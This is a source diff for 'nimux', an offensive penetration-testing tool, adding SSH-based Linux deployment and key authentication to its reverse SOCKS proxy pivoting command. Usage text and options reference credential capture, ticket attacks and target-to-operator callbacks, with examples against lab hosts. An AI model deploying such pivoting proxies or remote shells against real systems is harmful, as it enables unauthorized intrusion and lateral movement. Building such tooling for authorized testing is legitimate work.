@@ -33,7 +33,7 @@ import protocols/postgres/client as pgclient
 import protocols/http/client as httpclient
 import protocols/nfs/client as nfsclient
 
-const Version = "1.0.5"
+const Version = "1.0.6"
 const Author = "Chokri Hammedi (blue0x1)"
 const FileAttributeReparsePoint = 0x00000400'u32
 
@@ -391,21 +391,26 @@ type
     socksUserProcess: bool
     socksReverse: bool
     socksControlPort: int
+    socksLinux: bool
+    socksSshKey: string
 
 proc usageSocks() =
   echo """
-nimux socks - Deploy reverse TCP proxy on target via WinRM for pivoting
+  nimux socks - Deploy reverse TCP proxy on a target for pivoting
 
 USAGE
   nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] --reverse --listener <your-ip> [options]
+  nimux socks <target> --linux -u <user> {-p <pass>|--ssh-key <path>} --reverse --listener <your-ip> [options]
   nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] [options]
   nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] --kill [cleanup options]
+  nimux socks <target> --linux -u <user> {-p <pass>|--ssh-key <path>} --kill [cleanup options]
   nimux socks <target> -k [-u <user>] [-d <domain>] --reverse --listener <your-ip> [options]
 
 COMMAND FORMS
   deploy reverse       Use --reverse --listener <ip>. Target connects back to
                        the operator, and local 127.0.0.1:<socks-port> becomes
                        the SOCKS5 listener. Recommended for routed/pivoted labs.
+  linux reverse        Add --linux to use SSH transport and a Linux helper binary.
   deploy forward       Omit --reverse. The target listens on --bind:<socks-port>.
                        Use only when that target port is reachable from you.
   cleanup              Use --kill with the printed --pid, --socks-task, and/or
@@ -422,6 +427,7 @@ AUTHENTICATION
 
 DEPLOYMENT
   --port <n>           WinRM port (default 5985)
+                       With --linux, this becomes the SSH port (default 22)
   --reverse            Reverse mode: target dials back to --listener (recommended)
   --listener <ip>      Your IP the target connects back to
   --control-port <n>   TCP port for the reverse connection on your machine (default socks-port + 1)
@@ -429,6 +435,8 @@ DEPLOYMENT
   --bind <ip>          Forward mode only: SOCKS listen address on target (default 0.0.0.0)
   --auth <user:pass>   Forward mode only: SOCKS5 username/password auth on the proxy
   --user-process       Start proxy as the WinRM user instead of a scheduled task
+  --linux              Use SSH to deploy a Linux helper instead of WinRM
+  --ssh-key <path>     Native SSH private key for Linux deployment
   --ssl                Use HTTPS WinRM (port 5986)
   --timeout <ms>       WinRM/deployment timeout
   --remote <path>      Optional remote path for the helper binary
@@ -453,6 +461,8 @@ EXAMPLES
   nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5
   nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5 --socks-port 1080 --control-port 1081
   nimux socks dc01.garfield.htb -k --ccache admin.ccache -d garfield.htb --krb5-config krb5.conf --reverse --listener 10.10.14.5
+  nimux socks pivot01 -u ubuntu -p 'Pass' --linux --reverse --listener 10.10.14.5
+  nimux socks pivot01 -u ubuntu --ssh-key ~/.ssh/id_rsa --linux --reverse --listener 10.10.14.5
   nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --bind 0.0.0.0 --socks-port 1080 --auth user:pass
   nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --kill --pid 4812 --socks-task nimproxy0abc123 --remote 'C:\Users\...\nimproxyXXXX.exe'
 """
@@ -2201,6 +2211,7 @@ proc parseCli(): CliConfig =
     "on-behalf-of", "listener", "coerce-target", "capture-host", "capture-user", "capture-password", "capture-pass", "capture-hash", "capture-domain", "capture-out", "ticket-user", "ticket-service", "capture-seconds", "capture-interval", "script-path", "bind", "auth",
     "srvhost", "srvport", "challenge",
     "socks-port", "pid", "socks-remote", "socks-task", "control-port",
+    "ssh-key",
     "new-hash", "target-dn"]
   var rawArgs = commandLineParams()
   var normalized: seq[string] = @[]
@@ -2260,7 +2271,7 @@ proc parseCli(): CliConfig =
       "adcs-request", "adcs-auth", "adcs-rpc", "adcs-policy", "adcs-get-editflags", "adcs-get-disable-extension-list", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
       "get-gmsa", "dns-add", "dns-delete", "dns-replace", "adcs-template", "server",
       "add-member", "remove-member", "restore-deleted", "move", "bloodhound", "legacy", "recursive", "full", "trust-keys",
-      "lockout-aware", "schannel", "reverse",
+      "lockout-aware", "schannel", "reverse", "linux",
       "user-process",
       "enum-danger", "enum-impersonate", "enable-xp", "enable-ole", "enable-clr",
       "success", "coerce", "capture-tickets", "attack", "set-scriptpath", "kill",
@@ -2630,6 +2641,8 @@ proc parseCli(): CliConfig =
         try: result.socksPort = parseInt(value) except: discard
       of "control-port":
         try: result.socksControlPort = parseInt(value) except: discard
+      of "ssh-key":
+        result.socksSshKey = value
       of "kill":
         result.socksKill = true
       of "pid":
@@ -2642,6 +2655,8 @@ proc parseCli(): CliConfig =
         result.socksUserProcess = true
       of "reverse":
         result.socksReverse = true
+      of "linux":
+        result.socksLinux = true
       of "computers":
         result.computers = true
       of "asreproast":
@@ -3151,7 +3166,10 @@ proc parseCli(): CliConfig =
     of "krb5conf":
       result.port = 88
     of "socks":
-      result.port = if result.useSsl: 5986 else: 5985
+      if result.socksLinux:
+        result.port = 22
+      else:
+        result.port = if result.useSsl: 5986 else: 5985
       if result.socksPort == 0: result.socksPort = 1080
     else:
       discard
@@ -3300,7 +3318,8 @@ proc runSocksProxy(config: CliConfig) =
     let r = socksmod.killSocksProxy(host, config.port, timeout,
       config.username, config.password, config.ntlmHash, config.domain,
       config.socksRemotePath, config.socksPid, config.socksTaskName,
-      useSsl = config.useSsl, kerberos = config.kerberos)
+      useSsl = config.useSsl, kerberos = config.kerberos,
+      linuxBackend = config.socksLinux, sshKeyPath = config.socksSshKey)
     let j = socksProbeJson(host, config.port, socksPort, "kill", r.ok, r.message,
       reverse = config.socksReverse, controlPort = controlPort)
     if config.jsonOutput: echo $j
@@ -3312,7 +3331,10 @@ proc runSocksProxy(config: CliConfig) =
     listenIp,
     config.useSsl, config.kerberos, config.socksUserProcess or config.socksReverse,
     (if config.socksReverse: config.coerceListener else: ""),
-    (if config.socksReverse: controlPort else: 0))
+    (if config.socksReverse: controlPort else: 0),
+    linuxBackend = config.socksLinux,
+    sshKeyPath = config.socksSshKey,
+    remotePathOverride = config.socksRemotePath)
   let j = socksProbeJson(host, config.port, socksPort, "deploy", r.success, r.message,
     r.remotePath, r.pid, r.taskName, config.socksReverse, controlPort)
   if config.jsonOutput: echo $j
@@ -6386,21 +6408,21 @@ proc fetchAdcsCaDer(host: string; port: int; timeoutMs: int;
 proc generateAdcsCsr(config: CliConfig; includeRequestExtensions = true): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string]
 
 type
-  EvpPkey {.importc: "EVP_PKEY", header: "<openssl/evp.h>".} = object
-  X509Obj {.importc: "X509", header: "<openssl/x509.h>".} = object
-  X509NameObj {.importc: "X509_NAME", header: "<openssl/x509.h>".} = object
-  X509ExtObj {.importc: "X509_EXTENSION", header: "<openssl/x509.h>".} = object
+  EvpPkey {.importc: "EVP_PKEY", header: "<openssl/evp.h>", incompleteStruct.} = object
+  X509Obj {.importc: "X509", header: "<openssl/x509.h>", incompleteStruct.} = object
+  X509NameObj {.importc: "X509_NAME", header: "<openssl/x509.h>", incompleteStruct.} = object
+  X509ExtObj {.importc: "X509_EXTENSION", header: "<openssl/x509.h>", incompleteStruct.} = object
   X509v3Ctx {.importc: "X509V3_CTX", header: "<openssl/x509v3.h>".} = object
-  Asn1Integer {.importc: "ASN1_INTEGER", header: "<openssl/asn1.h>".} = object
-  Asn1Time {.importc: "ASN1_TIME", header: "<openssl/asn1.h>".} = object
-  EvpMd {.importc: "EVP_MD", header: "<openssl/evp.h>".} = object
-  BioObj {.importc: "BIO", header: "<openssl/bio.h>".} = object
-  BioMethod {.importc: "BIO_METHOD", header: "<openssl/bio.h>".} = object
-  X509ReqObj {.importc: "X509_REQ", header: "<openssl/x509.h>".} = object
-  Pkcs7Obj {.importc: "PKCS7", header: "<openssl/pkcs7.h>".} = object
-  Pkcs12Obj {.importc: "PKCS12", header: "<openssl/pkcs12.h>".} = object
-  Asn1Object {.importc: "ASN1_OBJECT", header: "<openssl/asn1.h>".} = object
-  Asn1OctetString {.importc: "ASN1_OCTET_STRING", header: "<openssl/asn1.h>".} = object
+  Asn1Integer {.importc: "ASN1_INTEGER", header: "<openssl/asn1.h>", incompleteStruct.} = object
+  Asn1Time {.importc: "ASN1_TIME", header: "<openssl/asn1.h>", incompleteStruct.} = object
+  EvpMd {.importc: "EVP_MD", header: "<openssl/evp.h>", incompleteStruct.} = object
+  BioObj {.importc: "BIO", header: "<openssl/bio.h>", incompleteStruct.} = object
+  BioMethod {.importc: "BIO_METHOD", header: "<openssl/bio.h>", incompleteStruct.} = object
+  X509ReqObj {.importc: "X509_REQ", header: "<openssl/x509.h>", incompleteStruct.} = object
+  Pkcs7Obj {.importc: "PKCS7", header: "<openssl/pkcs7.h>", incompleteStruct.} = object
+  Pkcs12Obj {.importc: "PKCS12", header: "<openssl/pkcs12.h>", incompleteStruct.} = object
+  Asn1Object {.importc: "ASN1_OBJECT", header: "<openssl/asn1.h>", incompleteStruct.} = object
+  Asn1OctetString {.importc: "ASN1_OCTET_STRING", header: "<openssl/asn1.h>", incompleteStruct.} = object
 
 proc EVP_RSA_gen(bits: cuint): ptr EvpPkey {.importc, header: "<openssl/rsa.h>".}
 proc EVP_PKEY_free(key: ptr EvpPkey) {.importc, header: "<openssl/evp.h>".}
@@ -10819,8 +10841,13 @@ proc rdpProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
 proc sshProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
   let tm = max(config.timeoutMs, 5000)
   if config.shellMode:
-    let r = await sshclient.sshShell(host, config.port, tm,
-      config.username, config.password)
+    let r =
+      if config.socksSshKey.len > 0:
+        await sshclient.sshShellKey(host, config.port, tm,
+          config.username, config.socksSshKey)
+      else:
+        await sshclient.sshShell(host, config.port, tm,
+          config.username, config.password)
     return %*{
       "protocol": "ssh", "host": host, "port": config.port,
       "reachable": r.reachable, "banner": r.banner,
@@ -10828,8 +10855,13 @@ proc sshProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
       "is_root": r.isRoot, "auth_message": r.authMessage
     }
   if config.remoteCommand.len > 0:
-    let r = await sshclient.sshExec(host, config.port, tm,
-      config.username, config.password, config.remoteCommand)
+    let r =
+      if config.socksSshKey.len > 0:
+        await sshclient.sshExecKey(host, config.port, tm,
+          config.username, config.socksSshKey, config.remoteCommand)
+      else:
+        await sshclient.sshExec(host, config.port, tm,
+          config.username, config.password, config.remoteCommand)
     return %*{
       "protocol": "ssh", "host": host, "port": config.port,
       "reachable": r.reachable, "banner": r.banner,
@@ -10837,9 +10869,14 @@ proc sshProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
       "is_root": r.isRoot, "auth_message": r.authMessage,
       "output": r.output, "stderr": r.stderrOut, "exit_code": r.exitCode
     }
-  if config.username.len > 0 and config.password.len > 0:
-    let r = await sshclient.sshExec(host, config.port, tm,
-      config.username, config.password, "id")
+  if config.username.len > 0 and (config.password.len > 0 or config.socksSshKey.len > 0):
+    let r =
+      if config.socksSshKey.len > 0:
+        await sshclient.sshExecKey(host, config.port, tm,
+          config.username, config.socksSshKey, "id")
+      else:
+        await sshclient.sshExec(host, config.port, tm,
+          config.username, config.password, "id")
     return %*{
       "protocol": "ssh", "host": host, "port": config.port,
       "reachable": r.reachable, "banner": r.banner,
@@ -18380,8 +18417,12 @@ proc main() =
         runShell(config)
       of "ssh":
         for host in config.targets:
-          discard waitFor sshclient.sshShell(host, config.port, max(config.timeoutMs, 5000),
-            config.username, config.password)
+          if config.socksSshKey.len > 0:
+            discard waitFor sshclient.sshShellKey(host, config.port, max(config.timeoutMs, 5000),
+              config.username, config.socksSshKey)
+          else:
+            discard waitFor sshclient.sshShell(host, config.port, max(config.timeoutMs, 5000),
+              config.username, config.password)
       of "postgres":
         runPostgresShell(config)
       else:
